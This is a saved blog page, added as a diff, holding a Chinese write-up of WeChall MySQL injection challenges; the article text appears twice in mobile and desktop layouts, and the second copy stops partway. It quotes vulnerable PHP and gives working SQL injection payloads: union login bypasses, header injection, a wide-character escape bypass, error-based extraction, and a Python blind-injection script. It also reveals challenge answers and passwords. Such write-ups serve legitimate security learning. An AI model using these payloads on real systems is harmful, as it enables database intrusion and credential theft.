@@ -1,0 +1,688 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./WeChall-mysql-WriteUp/font-awesome.min.css" rel="stylesheet"/>
+<link href="./WeChall-mysql-WriteUp/screen.css" rel="stylesheet"/>
+<link href="./WeChall-mysql-WriteUp/prism_okaidia.css" rel="stylesheet"/>
+<link href="./WeChall-mysql-WriteUp/bendawang.css" rel="stylesheet"/>
+<script src="./WeChall-mysql-WriteUp/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./WeChall-mysql-WriteUp/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./WeChall-mysql-WriteUp/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h1 id="wechallmysqlwriteup">WeChall mysql WriteUp</h1>
+<p style="max-width:100%;height:auto;">题目链接：http://www.wechall.net/challs/MySQL/by/chall_score/ASC/page-1</p>
+<h2 id="1noescape">1.No Escape</h2>
+<p style="max-width:100%;height:auto;">首先阅读源码，比较简单，就是只要有一个人的票数到达111了，那么就成功了，但是每当一个人的票数超过100时就会被重置。然后此处注入参数为vote_for，另外还有就是两个过滤，核心代码就在下面：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">    if ( (stripos($who, &amp;apos;id&amp;apos;) !== false) || (strpos($who, &amp;apos;/&amp;apos;) !== false) ) {
+        echo GWF_HTML::error(&amp;apos;No Escape&amp;apos;, &amp;apos;Please do not mess with the id. It would break the challenge for others&amp;apos;, false);
+        return;
+    }
+    $db = noesc_db();
+    $who = mysql_real_escape_string($who);
+    $query = "UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1";
+    if (false !== $db-&gt;queryWrite($query)) {
+        echo GWF_HTML::message(&amp;apos;No Escape&amp;apos;, &amp;apos;Vote counted for &amp;apos;.GWF_HTML::display($who), false);
+    }
+    noesc_stop100();
+</code></pre>
+<p style="max-width:100%;height:auto;">观察发现过滤似乎并没有什么卵用，因为在更新语句中根本没用单引号，只用了`符号，那么直接构造如下的payload就好了：</p>
+<pre><code style="max-width:100%;height:auto;">?vote_for=bill`=111--+
+</code></pre>
+<h2 id="2trainingmysqli">2. Training: MySQL I</h2>
+<p style="max-width:100%;height:auto;">这道题没啥可说的，最简单的SQLI，跳过</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">admin&amp;apos;#
+</code></pre>
+<h2 id="3trainingmysqlii">3.Training: MySQL II</h2>
+<p style="max-width:100%;height:auto;">这道题把密码和用户名分开来验证了，用户名查询处毫无过滤，核心检验代码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">$password = md5($password);
+
+    $query = "SELECT * FROM users WHERE username=&amp;apos;$username&amp;apos;";
+
+    if (false === ($result = $db-&gt;queryFirst($query))) {
+        echo GWF_HTML::error(&amp;apos;Auth2&amp;apos;, $chall-&gt;lang(&amp;apos;err_unknown&amp;apos;), false);
+        return false;
+    }
+
+
+    #############################
+    ### This is the new check ###
+    if ($result[&amp;apos;password&amp;apos;] !== $password) {
+        echo GWF_HTML::error(&amp;apos;Auth2&amp;apos;, $chall-&gt;lang(&amp;apos;err_password&amp;apos;), false);
+        return false;
+    } #  End of the new code  ###
+    #############################
+</code></pre>
+<p style="max-width:100%;height:auto;">很容易知道，用union构造查询就可以绕过了，如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">username=123&amp;apos; union select 1,&amp;apos;admin&amp;apos;,md5(&amp;apos;password&amp;apos;);#
+&amp;password=password
+&amp;login=Login
+</code></pre>
+<h2 id="4theguestbook">4.The Guestbook</h2>
+<p style="max-width:100%;height:auto;">首先看代码，看个大概之后直接分析核心代码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">$playerid = gbook_playerID(true);// Current Player
+    $userid = 0;#guestbook has no login yet.
+    $time = time();
+    $ip = gbook_getIP();
+    $message = mysql_real_escape_string($message);
+    $query = "INSERT INTO gbook_book VALUES(&amp;apos;$playerid&amp;apos;, $userid, $time, &amp;apos;$ip&amp;apos;, &amp;apos;$message&amp;apos;)";
+    if (false === $db-&gt;queryWrite($query)) {
+        echo GWF_HTML::err(&amp;apos;ERR_DATABASE&amp;apos;, array(__FILE__, __LINE__));
+        return false;
+    }
+</code></pre>
+<p style="max-width:100%;height:auto;">message就是我们在留言板所输入的部分，观察之后发现，它被过滤了，宽字符在这里是无法绕过的，然后就应该找找别的注入点，之后看到gbook_getIP()函数如下定义：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function gbook_getIP()
+{
+    if (isset($_SERVER[&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;])) {
+        return $_SERVER[&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;];
+    }
+    elseif (isset($_SERVER[&amp;apos;HTTP_VIA&amp;apos;])) {
+        return $_SERVER[&amp;apos;HTTP_VIA&amp;apos;];
+    }
+    else {
+        return $_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;];
+    }
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">这里直接获取了请求头中X<em>FORWARDED</em>FOR，所以我们只需要伪造一个带有X<em>FORWARDED</em>FOR的请求就可以完成注入了，burpsuite抓包之后选择对应的包然后构造如下：
+<br/><img alt="Alt text" data-action="zoom" src="./WeChall-mysql-WriteUp/20160127213027063" style="max-width:100%;height:auto;"/><br/>
+用repeater加上</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">X_FORWARDED_FOR:127.0.0.1,8888&amp;apos;,(select gbu_password from gbook_user where gbu_name=&amp;apos;admin&amp;apos;)) -- a
+</code></pre>
+<p style="max-width:100%;height:auto;">之后得到admin的密码：
+<br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-mysql-WriteUp/20160127213042787" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">TheBrownFoxAndTheLazyDog</p>
+<h2 id="5blindedbythelight">5.Blinded by the light</h2>
+<p style="max-width:100%;height:auto;">希望有大神能够帮帮我这道题，这道题是一个脚本爆破的题目，直接暴力枚举密码，然后由于代码中有次数限制，所以我们这里采用的是二分枚举，但是我这里遇到一个问题，就是我每次递交请求时候，它都默认为我是第一次尝试，然后密码就肯定不对，不知道怎么解决。。。求大神相助这道题。我的代码如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
+import re
+url = &amp;apos;http://www.wechall.net/challenge/blind_light/index.php&amp;apos;
+r=requests.session()
+s=r.get(url)
+word="0123456789ABCDEF"
+password=""
+for i in range(1,33):
+    start=0
+    end=15
+    while(start&lt;end):
+        mid=(start+end)/2
+        #print word[mid]
+        header={&amp;apos;COOKIE&amp;apos;:&amp;apos;WC=8800431-0-BFaTupbuIbCgudW1;&amp;apos;}
+        if(end-start==1):
+            param = "\&amp;apos; or substring(password,"+str(i)+",1)&gt;\&amp;apos;"+word[start]+"\&amp;apos;#"
+            payload={&amp;apos;injection&amp;apos;:param,&amp;apos;inject&amp;apos;:"Inject"}
+            result=r.post(url,data=payload,headers=header)
+            content=result.text
+            print content
+            if &amp;apos;Welcome back&amp;apos; in content:
+                start=end
+                break
+            else:
+                end=start
+                break
+        else:
+            param = "\&amp;apos; or substring(password,"+str(i)+",1)&lt;\&amp;apos;"+word[mid]+"\&amp;apos;#"
+            payload={&amp;apos;injection&amp;apos;:param,&amp;apos;inject&amp;apos;:"Inject"}
+            result=r.post(url,data=payload,headers=header)
+            content=result.text
+            #print content.encode(&amp;apos;utf-8&amp;apos;)
+            print content
+            pattern = re.compile(r&amp;apos;This was your(.*?)attempt&amp;apos;,re.S)
+            items=[]
+            items = re.findall(pattern,content)
+            print items
+            if &amp;apos;Welcome back&amp;apos; in content:
+                end=mid
+            else:
+                start=mid
+    password=password+word[start]
+    print password
+header={&amp;apos;COOKIE&amp;apos;:&amp;apos;WC=8800431-0-BFaTupbuIbCgudW1;&amp;apos;}
+payload={&amp;apos;thehash&amp;apos;:password,&amp;apos;mybutton&amp;apos;:"Enter"}
+result=r.post(url,data=payload,headers=header)
+</code></pre>
+<h2 id="6addslashes">6.addslashes</h2>
+<p style="max-width:100%;height:auto;">源代码就不贴了，核心就是一个典型的宽字符注入的问题。
+要求就是用"Admin"登录，关键在于它还并没有对password进行检验，这样子，直接构造绕过addslashes()函数就可以了。但是这里我遇到一个特别神奇的问题，如下，我使用的是火狐的插件hackerbar，然后下图的输入就可以过</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-mysql-WriteUp/20160212102446574" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">然后问题来了，我在输入框里面输入</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">用户名：%C0&amp;apos;+union+select+CHAR(65,100,109,105,110)#
+密码：1234
+</code></pre>
+<p style="max-width:100%;height:auto;">就没办法登录了，实在没有明白二者差距在哪里，看出来的大神求解释下呗。。。</p>
+<h2 id="7md5salt">7.MD5.SALT</h2>
+<p style="max-width:100%;height:auto;">这次终于没有源代码可以看了，根据提示的Hint说是数据库的表名叫做"users"，这个提示非常重要啊，我们再试试输入框，发现似乎并没有过滤，直接单引号就可以插入我们自己的查询语句了，应该是目前来说的最简单的题目了。
+尝试了几次之后直接构造如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; and 1=2 union select password,1 from users where username="Admin"#
+PS：它会回显select的第一个字段，由此来爆密码
+</code></pre>
+<p style="max-width:100%;height:auto;">然后从回显里面看出密码的MD5值是215c61d0104f8925b5f7e4e87a7cbdfa，查了查竟然要我付费，作为屌丝我当然不答应啦，所以就这样吧</p>
+<h2 id="9tablenames">9.Table Names</h2>
+<p style="max-width:100%;height:auto;">先在username里直接试试最简单的</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; or 1=1#
+</code></pre>
+<p style="max-width:100%;height:auto;">发现有点作用，于是判断只是单纯的单引号。题目要求的我们把库名和表名爆出来，所以我们先开始尝试报错注入，</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; and 1=2 union select 1,2,3#
+</code></pre>
+<p style="max-width:100%;height:auto;">然后琢磨一下，直接开始爆库名和表名就可以了</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; and 1=2 union select 1,2,database()#
+</code></pre>
+<p style="max-width:100%;height:auto;">得到库名是<strong>gizmore_tableu61</strong>
+所以继续吧所有表名都爆出来呗</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; and 1=2 union select 1,2,group_concat(table_name) from information_schema.columns where table_schema="gizmore_tableu61"#
+</code></pre>
+<p style="max-width:100%;height:auto;">由此即得到正确的表名为<strong>usertableus4</strong>
+所以最后的答案就是<strong>gizmore<em>tableu61</em>usertableus4</strong></p>
+<h2 id="tablenamesii">Table Names II</h2>
+<p style="max-width:100%;height:auto;">看源码，重点就是下面的过滤：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if (preg_match(&amp;apos;/statistics|tables|columns|table_constraints|key_column_usage|partitions|schema_privileges|schemata|database|schema\(\)/i&amp;apos;, $username.$password))
+    {
+        echo GWF_HTML::error(GWF_PAGE_TITLE, $chall-&gt;lang(&amp;apos;on_match&amp;apos;));
+    }
+</code></pre>
+<p style="max-width:100%;height:auto;">然后简单测试了一下，
+如下的payload是可以执行的：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; and 1=2 union select 1,2,3#
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-mysql-WriteUp/20160316203809801" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">然后来构造一下语句把，观察下，发现很多我们暴库需要的关键字都被过滤了。但是关键的库<code style="max-width:100%;height:auto;">information_schema</code>是没有被过滤的，然后就想办法爆东西吧。
+这里我们有一个比较常用的语句：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">show processlist
+</code></pre>
+<p style="max-width:100%;height:auto;">通过这个最起码可以看到库名，而这个语句主要是<code style="max-width:100%;height:auto;">information_schema</code>库中的一个叫做<code style="max-width:100%;height:auto;">proccesslist</code>表的内容，那么我们也可以来尝试一下爆出它的内容即可，</p>
+<p style="max-width:100%;height:auto;">下图是本机实测的截图：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-mysql-WriteUp/20160316203822131" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">挨个儿爆内容，最后有效的payload如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; and 1=2 union select info,2,3 from information_schema.processlist#
+</code></pre>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-mysql-WriteUp/20160316203837443" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">观察发现库名和表名都出来了，所以最后结果就是</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">nurfedtables37.userbobbytable7
+</code></pre>
+<h2 id="orderbyquery">Order By Query</h2>
+<p style="max-width:100%;height:auto;">这个观察源码发现注入点位于<code style="max-width:100%;height:auto;">order by</code>，那么就只有两种方法可行，一种是直接街上and构造双查询语句，第二种是在<code style="max-width:100%;height:auto;">DESC/ASC</code>后打上<code style="max-width:100%;height:auto;">,</code>号，然后再接上下一个<code style="max-width:100%;height:auto;">select</code>语句。
+但是这里我们看到源码中的关键句子如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">$query = "SELECT * FROM users ORDER BY $orderby $dir LIMIT 10";
+</code></pre>
+<p style="max-width:100%;height:auto;">而$dir就是<code style="max-width:100%;height:auto;">DESC/ASC</code>中的某一个，然后加上它会返回错误信息，所以就确定了就是报错注入了。这里报错注入有好几种方法，我用的是以下的语句：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">?by=3 and extractvalue(1, (select password from users where username=CHAR(65, 100, 109, 105, 110)))#
+</code></pre>
+<p style="max-width:100%;height:auto;">上述句子中<code style="max-width:100%;height:auto;">CHAR(65, 100, 109, 105, 110)</code>就是<code style="max-width:100%;height:auto;">Admin</code>，因为要爆出<code style="max-width:100%;height:auto;">Admin</code>的密码，直接加上限定就好了。结果截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-mysql-WriteUp/20160316234227432" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">这个MD5就是最后的答案：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">C3CBEB0C8ADC66F2922C65E7784BE14
+</code></pre>
+<p style="max-width:100%;height:auto;">这里最开始我遇到一个比较蠢的问题，最开始我的语句如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">?by=3 and extractvalue(1, concat(0x5c,(select password from users where username=CHAR(65, 100, 109, 105, 110))))#
+</code></pre>
+<p style="max-width:100%;height:auto;">自作多情的多用的了一个concat来连接答案，结果报错出的MD5值如图：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-mysql-WriteUp/20160316234239565" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">即：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">\3C3CBEB0C8ADC66F2922C65E7784BE1
+</code></pre>
+<p style="max-width:100%;height:auto;">而我怎么提交都是错的，后来才发现这个MD5值只有31位，然后我就意识到还有一位没有显示出来，因为这里默认只显示32位，而我的多此一举导致最开始的<code style="max-width:100%;height:auto;">\</code>符号占用了一位，所以答案的最后一位就没出来，这种问题还是一定要少犯一点的好，免得白白耽搁时间。</p>
+<h2 id="12lightinthedarkness">12.Light in the Darkness</h2>
+<p style="max-width:100%;height:auto;">这里是一道报错注入。
+报错注入我个人常用的两种，<code style="max-width:100%;height:auto;">ExtractValue</code>和<code style="max-width:100%;height:auto;">floor</code>。
+不过这里我们看看它给的核心代码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function blightVuln($password)
+{
+    # Do not mess with other sessions!
+    if ( (strpos($password, &amp;apos;/*&amp;apos;) !== false) || (stripos($password, &amp;apos;blight&amp;apos;) !== false) )
+    {
+        return false;
+    }
+
+    $db = blightDB();
+    $sessid = GWF_Session::getSessSID();
+    $query = "SELECT 1 FROM (SELECT password FROM blight WHERE sessid=$sessid) b WHERE password=&amp;apos;$password&amp;apos;";
+    return $db-&gt;queryFirst($query) !== false;
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">这里他把表名<code style="max-width:100%;height:auto;">blight</code>过滤了，也是比较蛋疼的，因为我们要通过<code style="max-width:100%;height:auto;">ExtractValue</code>爆出数据，那么我们就一定需要输入表名的，所以我们果断摒弃这个，选择通过&amp;apos;floor&amp;apos;来报错，原理这里我都不再赘述，不知道的可以私信我。因为主查询里面有了表名那么我们就在构造的时候就可以避开它，直接给上paylaod</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">&amp;apos; or (select count(*) from (select 1 union select 2 union select 3)x group by concat((select password),floor(rand(0)*2)))#
+</code></pre>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./WeChall-mysql-WriteUp/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h1 id="wechallmysqlwriteup">WeChall mysql WriteUp</h1>
+<p style="max-width:100%;height:auto;">题目链接：http://www.wechall.net/challs/MySQL/by/chall_score/ASC/page-1</p>
+<h2 id="1noescape">1.No Escape</h2>
+<p style="max-width:100%;height:auto;">首先阅读源码，比较简单，就是只要有一个人的票数到达111了，那么就成功了，但是每当一个人的票数超过100时就会被重置。然后此处注入参数为vote_for，另外还有就是两个过滤，核心代码就在下面：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">    if ( (stripos($who, &amp;apos;id&amp;apos;) !== false) || (strpos($who, &amp;apos;/&amp;apos;) !== false) ) {
+        echo GWF_HTML::error(&amp;apos;No Escape&amp;apos;, &amp;apos;Please do not mess with the id. It would break the challenge for others&amp;apos;, false);
+        return;
+    }
+    $db = noesc_db();
+    $who = mysql_real_escape_string($who);
+    $query = "UPDATE noescvotes SET `$who`=`$who`+1 WHERE id=1";
+    if (false !== $db-&gt;queryWrite($query)) {
+        echo GWF_HTML::message(&amp;apos;No Escape&amp;apos;, &amp;apos;Vote counted for &amp;apos;.GWF_HTML::display($who), false);
+    }
+    noesc_stop100();
+</code></pre>
+<p style="max-width:100%;height:auto;">观察发现过滤似乎并没有什么卵用，因为在更新语句中根本没用单引号，只用了`符号，那么直接构造如下的payload就好了：</p>
+<pre><code style="max-width:100%;height:auto;">?vote_for=bill`=111--+
+</code></pre>
+<h2 id="2trainingmysqli">2. Training: MySQL I</h2>
+<p style="max-width:100%;height:auto;">这道题没啥可说的，最简单的SQLI，跳过</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">admin&amp;apos;#
+</code></pre>
+<h2 id="3trainingmysqlii">3.Training: MySQL II</h2>
+<p style="max-width:100%;height:auto;">这道题把密码和用户名分开来验证了，用户名查询处毫无过滤，核心检验代码如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">$password = md5($password);
+
+    $query = "SELECT * FROM users WHERE username=&amp;apos;$username&amp;apos;";
+
+    if (false === ($result = $db-&gt;queryFirst($query))) {
+        echo GWF_HTML::error(&amp;apos;Auth2&amp;apos;, $chall-&gt;lang(&amp;apos;err_unknown&amp;apos;), false);
+        return false;
+    }
+
+
+    #############################
+    ### This is the new check ###
+    if ($result[&amp;apos;password&amp;apos;] !== $password) {
+        echo GWF_HTML::error(&amp;apos;Auth2&amp;apos;, $chall-&gt;lang(&amp;apos;err_password&amp;apos;), false);
+        return false;
+    } #  End of the new code  ###
+    #############################
+</code></pre>
+<p style="max-width:100%;height:auto;">很容易知道，用union构造查询就可以绕过了，如下：</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">username=123&amp;apos; union select 1,&amp;apos;admin&amp;apos;,md5(&amp;apos;password&amp;apos;);#
+&amp;password=password
+&amp;login=Login
+</code></pre>
+<h2 id="4theguestbook">4.The Guestbook</h2>
+<p style="max-width:100%;height:auto;">首先看代码，看个大概之后直接分析核心代码：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">$playerid = gbook_playerID(true);// Current Player
+    $userid = 0;#guestbook has no login yet.
+    $time = time();
+    $ip = gbook_getIP();
+    $message = mysql_real_escape_string($message);
+    $query = "INSERT INTO gbook_book VALUES(&amp;apos;$playerid&amp;apos;, $userid, $time, &amp;apos;$ip&amp;apos;, &amp;apos;$message&amp;apos;)";
+    if (false === $db-&gt;queryWrite($query)) {
+        echo GWF_HTML::err(&amp;apos;ERR_DATABASE&amp;apos;, array(__FILE__, __LINE__));
+        return false;
+    }
+</code></pre>
+<p style="max-width:100%;height:auto;">message就是我们在留言板所输入的部分，观察之后发现，它被过滤了，宽字符在这里是无法绕过的，然后就应该找找别的注入点，之后看到gbook_getIP()函数如下定义：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function gbook_getIP()
+{
+    if (isset($_SERVER[&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;])) {
+        return $_SERVER[&amp;apos;HTTP_X_FORWARDED_FOR&amp;apos;];
+    }
+    elseif (isset($_SERVER[&amp;apos;HTTP_VIA&amp;apos;])) {
+        return $_SERVER[&amp;apos;HTTP_VIA&amp;apos;];
+    }
+    else {
+        return $_SERVER[&amp;apos;REMOTE_ADDR&amp;apos;];
+    }
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">这里直接获取了请求头中X<em>FORWARDED</em>FOR，所以我们只需要伪造一个带有X<em>FORWARDED</em>FOR的请求就可以完成注入了，burpsuite抓包之后选择对应的包然后构造如下：
+<br/><img alt="Alt text" data-action="zoom" src="./WeChall-mysql-WriteUp/20160127213027063" style="max-width:100%;height:auto;"/><br/>
+用repeater加上</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">X_FORWARDED_FOR:127.0.0.1,8888&amp;apos;,(select gbu_password from gbook_user where gbu_name=&amp;apos;admin&amp;apos;)) -- a
+</code></pre>
+<p style="max-width:100%;height:auto;">之后得到admin的密码：
+<br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-mysql-WriteUp/20160127213042787" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">TheBrownFoxAndTheLazyDog</p>
+<h2 id="5blindedbythelight">5.Blinded by the light</h2>
+<p style="max-width:100%;height:auto;">希望有大神能够帮帮我这道题，这道题是一个脚本爆破的题目，直接暴力枚举密码，然后由于代码中有次数限制，所以我们这里采用的是二分枚举，但是我这里遇到一个问题，就是我每次递交请求时候，它都默认为我是第一次尝试，然后密码就肯定不对，不知道怎么解决。。。求大神相助这道题。我的代码如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
+import re
+url = &amp;apos;http://www.wechall.net/challenge/blind_light/index.php&amp;apos;
+r=requests.session()
+s=r.get(url)
+word="0123456789ABCDEF"
+password=""
+for i in range(1,33):
+    start=0
+    end=15
+    while(start&lt;end):
+        mid=(start+end)/2
+        #print word[mid]
+        header={&amp;apos;COOKIE&amp;apos;:&amp;apos;WC=8800431-0-BFaTupbuIbCgudW1;&amp;apos;}
+        if(end-start==1):
+            param = "\&amp;apos; or substring(password,"+str(i)+",1)&gt;\&amp;apos;"+word[start]+"\&amp;apos;#"
+            payload={&amp;apos;injection&amp;apos;:param,&amp;apos;inject&amp;apos;:"Inject"}
+            result=r.post(url,data=payload,headers=header)
+            content=result.text
+            print content
+            if &amp;apos;Welcome back&amp;apos; in content:
+                start=end
+                break
+            else:
+                end=start
+                break
+        else:
+            param = "\&amp;apos; or substring(password,"+str(i)+",1)&lt;\&amp;apos;"+word[mid]+"\&amp;apos;#"
+            payload={&amp;apos;injection&amp;apos;:param,&amp;apos;inject&amp;apos;:"Inject"}
+            result=r.post(url,data=payload,headers=header)
+            content=result.text
+            #print content.encode(&amp;apos;utf-8&amp;apos;)
+            print content
+            pattern = re.compile(r&amp;apos;This was your(.*?)attempt&amp;apos;,re.S)
+            items=[]
+            items = re.findall(pattern,content)
+            print items
+            if &amp;apos;Welcome back&amp;apos; in content:
+                end=mid
+            else:
+                start=mid
+    password=password+word[start]
+    print password
+header={&amp;apos;COOKIE&amp;apos;:&amp;apos;WC=8800431-0-BFaTupbuIbCgudW1;&amp;apos;}
+payload={&amp;apos;thehash&amp;apos;:password,&amp;apos;mybutton&amp;apos;:"Enter"}
+result=r.post(url,data=payload,headers=header)
+</code></pre>
+<h2 id="6addslashes">6.addslashes</h2>
+<p style="max-width:100%;height:auto;">源代码就不贴了，核心就是一个典型的宽字符注入的问题。
+要求就是用"Admin"登录，关键在于它还并没有对password进行检验，这样子，直接构造绕过addslashes()函数就可以了。但是这里我遇到一个特别神奇的问题，如下，我使用的是火狐的插件hackerbar，然后下图的输入就可以过</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./WeChall-mysql-WriteUp/20160212102446574" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">然后问题来了，我在输入框里面输入</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">用户名：%C0&amp;apos;+union+select+CHAR(65,100,109,105,110)#
+密码：1234
+</code></pre>
+<p style="max-width:100%;height:auto;">就没办法登录了，实在没有明白二者差距在哪里，看出来的大神求解释下呗。。。</p>
+<h2 id="7md5salt">7.MD5.SALT</h2>
